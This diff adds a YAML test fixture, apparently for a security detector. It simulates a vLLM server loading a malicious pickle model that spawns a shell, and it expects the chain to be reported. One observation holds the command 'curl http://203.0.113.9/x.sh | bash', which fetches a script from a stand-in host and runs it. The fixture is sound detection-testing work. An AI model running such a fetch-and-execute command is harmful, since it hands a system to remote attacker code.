@@ -1,0 +1,32 @@
+subjects:
+  shell:
+    session: pid/100:1
+    program: /bin/bash
+    actors: [{id: u1, name: MLOps, email: mlops@example.com}]
+    device: gpu-1
+    source: probe
+  vllm:
+    session: pid/101:1
+    parent: shell
+    program: /usr/bin/python3
+    actors: [{id: u1, name: MLOps}]
+    device: gpu-1
+    source: probe
+  payload:
+    session: pid/102:1
+    parent: vllm
+    program: /bin/sh
+    actors: [{id: u1, name: MLOps}]
+    device: gpu-1
+    source: probe
+observations:
+  - {kind: session_start, subject: shell}
+  - {kind: spawn, subject: vllm, cmdline: "python3 -m vllm.entrypoints.openai.api_server --model evil/model-7b"}
+  - {kind: http_request, subject: vllm, url: "https://huggingface.co/evil/model-7b/resolve/main/pytorch_model.bin", method: GET, request_id: r1}
+  - {kind: file_read, subject: vllm, path: /root/.cache/huggingface/hub/models--evil--model-7b/blobs/pytorch_model.bin}
+  - {kind: spawn, subject: payload, cmdline: "sh -c 'curl http://203.0.113.9/x.sh | bash'"}
+expect:
+  action: report
+  reason_contains: "model-loader, pickle-payload-exec, pickle-checkpoint-read, remote-weights-fetch"
+  output_contains: ["lineage: sh -> python3 -> bash"]
+  chain_min: 4
